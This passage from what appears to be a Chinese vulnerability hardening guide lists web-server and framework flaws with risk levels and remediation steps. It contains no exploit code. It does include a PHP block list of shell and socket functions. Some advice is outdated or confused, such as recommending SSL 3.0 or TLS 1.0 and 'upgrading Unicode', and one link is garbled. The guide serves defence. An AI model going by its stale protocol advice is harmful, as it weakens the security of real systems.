2服务器上均可利用该漏洞远程执行任意命令<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-045命令执行漏洞"><a href="#S2-045命令执行漏洞" class="headerlink" title="S2-045命令执行漏洞"></a>S2-045命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件时通过修改HTTP请求头中的 Content-Type 值来触发该漏洞，进而执行系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-046命令执行漏洞"><a href="#S2-046命令执行漏洞" class="headerlink" title="S2-046命令执行漏洞"></a>S2-046命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件的大小（由 Content-Length 头指定）大于 Struts2 允许的最大大小（2GB），文件名内容构造恶意的 OGNL 来触发该漏洞，进而执行系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-052命令执行漏洞"><a href="#S2-052命令执行漏洞" class="headerlink" title="S2-052命令执行漏洞"></a>S2-052命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="JDWP远程命令执行漏洞"><a href="#JDWP远程命令执行漏洞" class="headerlink" title="JDWP远程命令执行漏洞"></a>JDWP远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>JDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。当对外开启该协议的Java调试模式时，存在远程命令执行漏洞。允许攻击者远程执行代码，获得服务器权限。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="ElasticSearch命令执行漏洞"><a href="#ElasticSearch命令执行漏洞" class="headerlink" title="ElasticSearch命令执行漏洞"></a>ElasticSearch命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>该漏洞存在于一个名为ElasticSearch.yml的文件，在这个文件中存在一个配置项“script.disable_dynamic”，默认为“false”。此默认配置允许服务器动态执行用户发送的任意代码。黑客只需要通过一个URL地址向服务器传送一段代码，就可以创建和执行他们自己的程序。一旦黑客获得通过，他们在服务器上的操作将不受任何限制，包括窃取网站中的用户账号及密码等敏感信息，或者留下一个后门程序。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="Resin任意文件读取漏洞"><a href="#Resin任意文件读取漏洞" class="headerlink" title="Resin任意文件读取漏洞"></a>Resin任意文件读取漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>安装某些版本Resin服务器的网站存在可读取任意文件的漏洞，攻击者利用该漏洞可以读取网站服务器的任意文件内容。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="GNU-Bash远程命令执行"><a href="#GNU-Bash远程命令执行" class="headerlink" title="GNU Bash远程命令执行"></a>GNU Bash远程命令执行</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="Unicode-转换漏洞"><a href="#Unicode-转换漏洞" class="headerlink" title="Unicode 转换漏洞"></a>Unicode 转换漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在Unicode在转换时，由于超长字节序列和错误格式引起子序列的安全问题。通过特殊的编码格式绕过程序对恶意字符的检测，可以用在SQL注入、XSS等。<br><strong>加固建议：</strong><br>1.升级Unicode版本至官方最新稳定版本<a href="http://www.unicode.org/">http://www.unicode.org</a><br>2.Unicode转化UTF-8编码后，对转换后进行安全检测，对特殊字符过滤或进行安全编码后输出。</p><h2 id="检测到网站被黑痕迹"><a href="#检测到网站被黑痕迹" class="headerlink" title="检测到网站被黑痕迹"></a>检测到网站被黑痕迹</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站页面已被篡改或已有入侵痕迹。<br><strong>加固建议：</strong><br>清除网站木马，全面检测网站漏洞并及时修复。</p><h2 id="使用被弃用的SSL-2-0协议"><a href="#使用被弃用的SSL-2-0协议" class="headerlink" title="使用被弃用的SSL 2.0协议"></a>使用被弃用的SSL 2.0协议</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站https使用了SSL 2.0协议。该协议非常老旧且已被弃用。该协议存在大量已知的安全漏洞，比如DROWN漏洞等。<br><strong>加固建议：</strong><br>禁用SSL 2.0或者使用SSL 3.0 或TLS 1.0代替。</p><h2 id="OpenSSL远程内存泄露漏洞（心脏滴血漏洞）"><a href="#OpenSSL远程内存泄露漏洞（心脏滴血漏洞）" class="headerlink" title="OpenSSL远程内存泄露漏洞（心脏滴血漏洞）"></a>OpenSSL远程内存泄露漏洞（心脏滴血漏洞）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OpenSSL是一款开放源码的SSL实现，用来实现网络通信的高强度加密。漏洞与OpenSSL TLS/DTLS传输层安全协议heartbeat扩展组件(RFC6520)相关，因此漏洞又被称为“heartbleed bug”（中文名称：“心血”漏洞）。该漏洞无需任何特权信息或身份验证，就可以获得X.509证书的私钥、用户名与密码、cookies等信息，进一步可直接从服务提供商和用户通讯中窃取聊天工具消息、电子邮件以及重要的商业文档和通信等私密数据。<br><strong>加固建议：</strong><br>升级OpenSSL版本到最新的1.0.1g；使用-DOPENSSL_NO_HEARTBEATS参数重新编译低版本的OpenSSL以禁用Heartbleed模块。</p><h2 id="JBoss-Seam参数化EL表达式远程代码执行漏洞"><a href="#JBoss-Seam参数化EL表达式远程代码执行漏洞" class="headerlink" title="JBoss Seam参数化EL表达式远程代码执行漏洞"></a>JBoss Seam参数化EL表达式远程代码执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>JBoss Seam是一个Java EE5框架，把JSF与EJB3.0组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。<br>JBoss Seam处理某些参数化JBoss EL表达式的方式存在输入过滤漏洞（ CVE-2010-1871）。如果远程攻击者能够诱骗通过认证的JBoss Seam用户访问特制的网页，就可能导致执行任意代码<br><strong>加固建议：</strong><br>升级至4.3.0 EL4或以上更高的、确认已修复此漏洞的版本。参考链接：<a href="https://bugzilla./#ff0000hat.com/show_bug.cgi?id=615956">https://bugzilla.#ff0000hat.com/show_bug.cgi?id=615956</a></p><h2 id="Weblogic-Java反序列化远程命令执行漏洞"><a href="#Weblogic-Java反序列化远程命令执行漏洞" class="headerlink" title="Weblogic Java反序列化远程命令执行漏洞"></a>Weblogic Java反序列化远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Weblogic存在Java反序列化漏洞，攻击者可以远程执行系统命令，获得服务器权限。<br><strong>加固建议：</strong><br>及时升级官方补丁。</p><h2 id="JBoss反序列化漏洞"><a href="#JBoss反序列化漏洞" class="headerlink" title="JBoss反序列化漏洞"></a>JBoss反序列化漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法,并且该方法在相关对象反序列化时并未进行任何校验，导致远程代码执行。利用漏洞，允许攻击者远程执行系统命令，获得服务器权限，导致服务器运行安全风险。<br><strong>加固建议：</strong><br>1.针对JBoss Java反序列化漏洞，建议更新jboss版本到最新版（<a href="http://www.jboss.org/%EF%BC%89%E6%88%96">http://www.jboss.org/）或</a> 更新官方补丁。<br>2.针对数据库帐号密码进行修改，要求密码长度8位数以上，密码复杂程度必须包含数字、大小写字母及特殊字符。<br>3.对服务器进行全面安全检查，及时排查、清除webshell等后门文件；及时修改数据库密码等。</p><h2 id="JBoss-JMXInvokerServlet远程命令执行漏洞"><a href="#JBoss-JMXInvokerServlet远程命令执行漏洞" class="headerlink" title="JBoss JMXInvokerServlet远程命令执行漏洞"></a>JBoss JMXInvokerServlet远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Jboss在默认安装的时候，会安装http-invoker.sar站点，当请求invoker/JMXInvokerServlet或invoker/EJBInvokerServlet会调用org.jboss.invocation.http.servlet.InvokerServlet.class处理请求。该类对GET请求和POST请求，统一调用processRequest函数处理，因此，攻击者需要自己构造一个jboss的类，并且将其序列化，然后将序列化的数据直接提交到存在漏洞站点的invoker/JMXInvokerServlet页面，恶意代码将会被执行。<br><strong>加固建议：</strong><br>建议删除或禁止访问/invoker/JMXInvokerServlet文件。</p><h2 id="Apache-ActiveMQ远程代码执行漏洞-CVE-2016-3088"><a href="#Apache-ActiveMQ远程代码执行漏洞-CVE-2016-3088" class="headerlink" title="Apache ActiveMQ远程代码执行漏洞 (CVE-2016-3088)"></a>Apache ActiveMQ远程代码执行漏洞 (CVE-2016-3088)</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。<br><strong>加固建议：</strong><br>1.ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。<br>2.通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能</p><h2 id="Apache-Tomcat示例目录漏洞"><a href="#Apache-Tomcat示例目录漏洞" class="headerlink" title="Apache Tomcat示例目录漏洞"></a>Apache Tomcat示例目录漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>tomcat安装时默认的演示、文档页面，会造成信息泄露和XSS跨站脚本漏洞，攻击者可以创建、销毁或控制session。<br><strong>加固建议：</strong><br>删除相关功能演示页面。</p><h2 id="Tomcat版本过低漏洞"><a href="#Tomcat版本过低漏洞" class="headerlink" title="Tomcat版本过低漏洞"></a>Tomcat版本过低漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Tomcat由于版本过低存在安全漏洞。<br><strong>加固建议：</strong><br>升级Tomcat版本或及时打补丁。</p><h2 id="S2-053命令执行漏洞"><a href="#S2-053命令执行漏洞" class="headerlink" title="S2-053命令执行漏洞"></a>S2-053命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Apache Struts2 Freemarker标签如果被错误的配置使用，将会导致RCE远程代码执行漏洞。<br><strong>加固建议：</strong><br>1.升级到Apache Struts版本2.5.12或2.3.34<br>2.使用只读属性来初始化value属性（仅限getter属性）<br>3.Freemarker标签内容不要通过Request方式获取 </p><h2 id="HPPT-sys远程代码执行漏洞（MS15-034）"><a href="#HPPT-sys远程代码执行漏洞（MS15-034）" class="headerlink" title="HPPT.sys远程代码执行漏洞（MS15-034）"></a>HPPT.sys远程代码执行漏洞（MS15-034）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。<br>影响以下版本操作系统的IIS服务器：Windows 7、Windows 8、Windows server 2008、Windows server 2012<br><strong>加固建议：</strong><br>用户安装微软官方修复补丁（3042553）。<br><a href="https://support.microsoft.com/zh-cn/kb/3042553">https://support.microsoft.com/zh-cn/kb/3042553</a></p><h2 id="WebDav文件上传-信息泄露漏洞"><a href="#WebDav文件上传-信息泄露漏洞" class="headerlink" title="WebDav文件上传/信息泄露漏洞"></a>WebDav文件上传/信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server文件进行读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。远程攻击者可能利用此漏洞非授权读写文件。<br><strong>加固建议：</strong><br>通常情况下网站不需要支持额外的方法，建议禁用WebDav服务，关闭PUT、MOVE、COPY等方法。</p><h2 id="slowhttp拒绝服务攻击"><a href="#slowhttp拒绝服务攻击" class="headerlink" title="slowhttp拒绝服务攻击"></a>slowhttp拒绝服务攻击</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>如果远程攻击者使用发包工具向Apache服务器发送了不完整的HTTP请 求，服务器会打开连接等待接受完整的头，但如果发包工具不再继续发送完整请求而是发送无效头的话，就会一直保持打开的连接。这种攻击所造成的影响很严重， 因为攻击者不需要发送很大的通讯就可以耗尽服务器上的可用连接。也就是说，即使低带宽的用户也可以攻击大流量的服务器。<br><strong>加固建议：</strong><br>1.升级到最新版的apache<br>2.在httpd.conf中添加RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500<br>3.直接在 iptables 中限制每个 IP 的连接数可以解决以上绝大部分问题，除非攻击者拥有众多肉鸡，否则单 IP 的攻击将失去效果。<br>iptables -A INPUT -p tcp –syn –dport 8889 -m connlimit –connlimit-above 20 -j REJECT –reject-with tcp-reset</p><h2 id="jQuery版本过低（jQuery低版本存在跨站）"><a href="#jQuery版本过低（jQuery低版本存在跨站）" class="headerlink" title="jQuery版本过低（jQuery低版本存在跨站）"></a>jQuery版本过低（jQuery低版本存在跨站）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>jQuery 1.6.3之前版本中存在跨站脚本漏洞。当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。<br><strong>加固建议：</strong><br>升级jQuery版本。</p><h2 id="不安全的javascript库文件"><a href="#不安全的javascript库文件" class="headerlink" title="不安全的javascript库文件"></a>不安全的javascript库文件</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>该版本的javascript库存在多个安全漏洞<br><strong>加固建议：</strong><br>升级javascript库版本。</p><h2 id="传输层保护不足漏洞"><a href="#传输层保护不足漏洞" class="headerlink" title="传输层保护不足漏洞"></a>传输层保护不足漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>传输层保护不足，会暴露传输的数据，导致数据被窃听，账号被盗等，如果是管理员的账号面临这个问题，那么将会导致整个网站处于数据暴露的状态，将对网站和用户造成严重的甚至无法挽回的损失。<br><strong>加固建议：</strong><br>1.对所有敏感的页面使用SSL，非SSL请求的页面应该被重定向到SSL请求的页面。<br>2.对所有敏感的Cookie，设置“secure”的flag。<br>3.保证SSL的提供商只支持强大的算法，这样就不能够被轻易破解。（使用标准的强算法）<br>4.确保您的证书是有效的，不过期，不被撤销，并匹配这个网站使用的所有域。<br>5.后台和其他的连接也应该使用SSL或其他加密技术。<br>6.即使是开发者的注释也应该很好的被保护，防止信息泄露。</p><h2 id="服务器启用了TRACE-Method方法"><a href="#服务器启用了TRACE-Method方法" class="headerlink" title="服务器启用了TRACE Method方法"></a>服务器启用了TRACE Method方法</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong></p><ol><li>恶意攻击者可以通过TRACE Method返回的信息了解到网站前端的一些信息，如缓存服务器等，从而为下一步的攻击提供便利。</li><li>恶意攻击者可以通过TRACE Method进行XSS攻击</li><li>即使网站对关键页面启用了HttpOnly头标记和禁止脚本读取cookie信息，那么通过TRACE Method恶意攻击者还是可以绕过这个限制读取到cookie信息。</li></ol><p>  <strong>加固建议：</strong><br>  禁用TRACE方法。</p><h2 id="点击劫持漏洞（X-Frame-Options头缺失）"><a href="#点击劫持漏洞（X-Frame-Options头缺失）" class="headerlink" title="点击劫持漏洞（X-Frame-Options头缺失）"></a>点击劫持漏洞（X-Frame-Options头缺失）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>通过覆盖不可见的框架误导受害者点击，受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。<br><strong>加固建议：</strong><br>设置X-Frame-Options值来防御利用iframe嵌套的点击劫持攻击。</p><h2 id="启用了不安全的HTTP方法（启用了OPTIONS方法）"><a href="#启用了不安全的HTTP方法（启用了OPTIONS方法）" class="headerlink" title="启用了不安全的HTTP方法（启用了OPTIONS方法）"></a>启用了不安全的HTTP方法（启用了OPTIONS方法）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>开启了不安全的HTTP方法：DELTE/SEARCE/COPY，MOVE/PROPFIND/PROPPATCH/MKCOL/LOCK/UNLOCK/PUT，可能会在Web 服务器上上载、修改或删除Web 页面、脚本和文件。<br><strong>加固建议：</strong><br>如果服务器不需要支持WebDAV，请务必禁用它，或禁止不必要的HTTP 方法。</p><h2 id="域名访问限制不严格"><a href="#域名访问限制不严格" class="headerlink" title="域名访问限制不严格"></a>域名访问限制不严格</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>目标存在域名访问限制不严格漏洞。Http请求的Hostname字段没有严格的域名限制，导致可以绕过一些防护措施。<br><strong>加固建议：</strong><br>配置WEB服务器，限制只能以域名形式访问服务器。</p><h2 id="SVN源代码泄露"><a href="#SVN源代码泄露" class="headerlink" title="SVN源代码泄露"></a>SVN源代码泄露</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>造成SVN源代码漏洞的主要原因是管理员操作不规范。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。<br>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。<br><strong>加固建议：</strong><br>针对SVN信息泄露漏洞，建议删除WEB目录里的SVN文件或限制访问.svn目录，并升级SVN软件至1.7或以上更高版本</p><h2 id="idea工程目录信息泄露漏洞"><a href="#idea工程目录信息泄露漏洞" class="headerlink" title=".idea工程目录信息泄露漏洞"></a>.idea工程目录信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>.idea目录用来放置开发工程的一些配置文件，通常是.xml文件。其中workspace.xml里面存放一些开发者个人配置，比如开发路径、开发环境等。里面包含一些敏感信息。<br><strong>加固建议：</strong><br>生产环境中删除.idea目录及该目录下的文件，或配置网站服务器禁止访问.idea目录。</p><h2 id="ASP-NET-Padding-Oracle信息泄露-MS10-070"><a href="#ASP-NET-Padding-Oracle信息泄露-MS10-070" class="headerlink" title="ASP.NET_Padding_Oracle信息泄露(MS10-070)"></a>ASP.NET_Padding_Oracle信息泄露(MS10-070)</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br> ASP.NET由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。<br><strong>加固建议：</strong><br>建议将Microsoft .NET Framework 更新至最新版本。</p><h2 id="git信息泄露"><a href="#git信息泄露" class="headerlink" title=".git信息泄露"></a>.git信息泄露</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>泄露网站敏感信息，攻击者可直接获取源码信息实施进一步攻击。<br><strong>加固建议：</strong><br>删除.git目录。</p><h2 id="错误页面信息泄露（应用程序错误信息）"><a href="#错误页面信息泄露（应用程序错误信息）" class="headerlink" title="错误页面信息泄露（应用程序错误信息）"></a>错误页面信息泄露（应用程序错误信息）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者可以根据错误或警告消息收集服务器信息。<br><strong>加固建议：</strong><br>1.关闭web服务器错误提示；<br>2.关闭运行平台的错误提示；<br>3.建立错误机制，不要把真实的错误反馈给访问者。捕获后台抛出的异常，制定异常固定跳转页面，如500错误，跳转到相应页面，例如“系统异常请与管理员联系”，403异常，找不到页面等等。</p><h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。<br><strong>加固建议：</strong><br>1.删除不必要的备份文件；<br>2.设置访问权限；<br>3.将备份文件放至服务器其它目录下。</p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者通过不指定url中的具体文件，来查看某个目录下的所有文件和目录结构。<br><strong>加固建议：</strong><br>针对目录遍历漏洞，建议通过修改配置文件，去除Web 容器（如Apache）的文件目录索引功能。</p><h2 id="IIS短文件名漏洞"><a href="#IIS短文件名漏洞" class="headerlink" title="IIS短文件名漏洞"></a>IIS短文件名漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Microsoft IIS在实现上存在文件枚举漏洞，攻击者可以利用“<del>”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。<br><strong>加固建议：</strong><br>针对IIS短文件名漏洞，建议禁止url中使用“</del>”或它的Unicode编码，或关闭windows的8.3格式功能。</p><h2 id="源代码泄露漏洞"><a href="#源代码泄露漏洞" class="headerlink" title="源代码泄露漏洞"></a>源代码泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>部分或全部页面源代码泄露，攻击者可审查源代码泄露的可用信息进一步渗透。<br><strong>加固建议：</strong><br>删除源代码文件或对需要的未解析的源代码进行解析。</p><h2 id="robots-txt文件泄露"><a href="#robots-txt文件泄露" class="headerlink" title="robots.txt文件泄露"></a>robots.txt文件泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露网站敏感信息，包括网站的后台页面或其它隐私页面。<br><strong>加固建议：</strong><br>1.robots.txt 文件不应用来保护或隐藏信息。<br>2.应该将敏感的文件和目录移到另一个隔离的子目录，以便将这个目录排除在 Web Robot 搜索之外。如下列示例所示，将文件移到“folder”之类的非特定目录名称是比较好的解决方案： New directory structure: /folder/passwords.txt /folder/sensitive_folder/<br>New robots.txt: User-agent: * Disallow: /folder/<br>3.如果您无法更改目录结构，且必须将特定目录排除于 Web Robot 之外，在 robots.txt 文件中，请只用局部名称。虽然这不是最好的解决方案，但至少它能加大完整目录名称的猜测难度。例如，如果要排除“sensitive_folder”和 “passwords.txt”，请使用下列名称（假设 Web 根目录中没有起始于相同字符的文件或目录）： robots.txt: User-agent: * Disallow: /se Disallow: /pa。</p><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>敏感信息泄露一般包括：中间件、软件框架（cms）类型和版本信息，数据库表结构、网站架构、账号密码体系等等。这些信息一般在服务器错误信息、html注释、隐藏表单、示例文件等地方出现。攻击者得到这些信息，有助于缩小攻击范围，进行有针对性的更深层次的攻击。<br><strong>加固建议：</strong><br>对于一般信息泄露，删除无用页面，或删除页面中的敏感信息即可。对于敏感报错信息泄露，需要设置代码捕获异常，并抛出异常，服务端出现异常后不在客户端回显，统一返回不包含敏感信息的错误页面。</p><h2 id="Github信息泄露漏洞"><a href="#Github信息泄露漏洞" class="headerlink" title="Github信息泄露漏洞"></a>Github信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>开发人员使用Github进行代码管理。而免费用户在Github上的项目内容可在网站中检索到，并对所有用户开放可查看。泄露的敏感信息一般包括：软件源代码、程序账号密码等等。攻击者得到这些信息，可以进行代码审计，更有针对性的找到网站漏洞，甚至可以获得用户账号密码，直接登录获得用户权限。<br><strong>加固建议：</strong><br>删除敏感的Github项目代码，对可能泄露的帐号密码及时进行修改。</p><h2 id="PHP探针信息泄露"><a href="#PHP探针信息泄露" class="headerlink" title="PHP探针信息泄露"></a>PHP探针信息泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>PHP探针文件会导致网站敏感信息泄露<br><strong>加固建议：</strong><br>删除默认安装PHP探针文件。</p><h2 id="phpinfo页面泄露"><a href="#phpinfo页面泄露" class="headerlink" title="phpinfo页面泄露"></a>phpinfo页面泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露网站服务器敏感信息，包括网站物理路径、PHP版本、服务器信息及环境变量等。<br><strong>加固建议：</strong><br>1.通过修改服务器环境内php.ini文件，将“expose_php = On”修改成“expose_php = Off”然后重启php即可。<br>2.如果确实需要该测试信息，在测试时使用，测试完毕后将该文件删除掉。<br>3.若无需要可以将一些php的危险函数禁用，打开/etc/php.ini文件，查找到 disable_functions，添加需禁用的以下函数名：phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</p><h2 id="发现隐藏目录"><a href="#发现隐藏目录" class="headerlink" title="发现隐藏目录"></a>发现隐藏目录</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>尝试了检测服务器上的隐藏目录，403 Forbidden 响应泄露了存在此目录，即使不允许对其进行访问，泄露网站目录结构。<br><strong>加固建议：</strong><br>可对禁止的资源发布“404 - Not Found”响应状态代码，或者将其完全除去。</p><h2 id="内部IP地址泄露"><a href="#内部IP地址泄露" class="headerlink" title="内部IP地址泄露"></a>内部IP地址泄露</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>泄露内网IP地址<br><strong>加固建议：</strong><br>禁止将内网IP置于网站页面或代码层中。</p><h2 id="OpenSSH-CBC模式信息泄露漏洞"><a href="#OpenSSH-CBC模式信息泄露漏洞" class="headerlink" title="OpenSSH CBC模式信息泄露漏洞"></a>OpenSSH CBC模式信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>配置为CBC模式，OpenSSH没有正确地处理分组密码算法加密的SSH会话中所出现的错误，导致可能泄露密文中任意块最多32位纯文本。<br><strong>加固建议：</strong><br>临时解决方案：在SSH会话中仅使用CTR模式加密算法，如AES-CTR<br>目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<br><a href="https://downloads.ssh.com/">https://downloads.ssh.com/</a></p><h2 id="未加密的登录请求"><a href="#未加密的登录请求" class="headerlink" title="未加密的登录请求"></a>未加密的登录请求</h2><p><strong>风险级别：</strong><font color="#00b0f0"  